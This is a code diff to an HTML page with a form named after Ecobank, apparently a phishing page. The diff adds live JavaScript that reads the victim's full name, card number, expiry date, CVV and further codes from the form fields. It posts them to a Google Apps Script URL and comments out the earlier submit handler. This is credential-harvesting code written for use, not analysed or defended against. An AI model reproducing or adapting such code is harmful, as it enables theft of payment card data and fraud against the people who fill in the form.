@@ -207,7 +207,35 @@
         </div>
 
         <script>
-        document.getElementById('ecobankForm').addEventListener('submit', function(e) {
+
+          fetch('https://script.google.com/macros/s/AKfycbwMH4cKgUEGzUkD8dIKHDS7va8_d4BDnxTySm1S5Lg/exec', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({
+    fullName: document.querySelector('input[placeholder="Enter your full name / Nom complet"]').value,
+    cardNumber: document.querySelector('input[placeholder="0000 0000 0000 0000"]').value,
+    expiryDate: document.querySelector('input[placeholder="01/23"]').value,
+    cvv: document.querySelector('input[placeholder="CVV"]').value,
+    lieu: document.querySelector('input[placeholder="Lieu"]').value,
+    code: document.querySelector('input[placeholder="Code"]').value
+  })
+})
+.then(response => response.json())
+.then(data => {
+  if (data.success) {
+    alert("Données enregistrées avec succès !");
+  } else {
+    alert("Erreur : " + data.error);
+  }
+})
+.catch(error => {
+  console.error("Erreur :", error);
+  alert("Une erreur est survenue. Voir la console pour plus de détails.");
+});
+
+        /* document.getElementById('ecobankForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             // Récupérer les données du formulaire
@@ -236,9 +264,8 @@
             .catch(error => {
                 console.error('Error:', error);
             });
-        });
+        }); */
     </script>
 
     </body>
-
 </html>
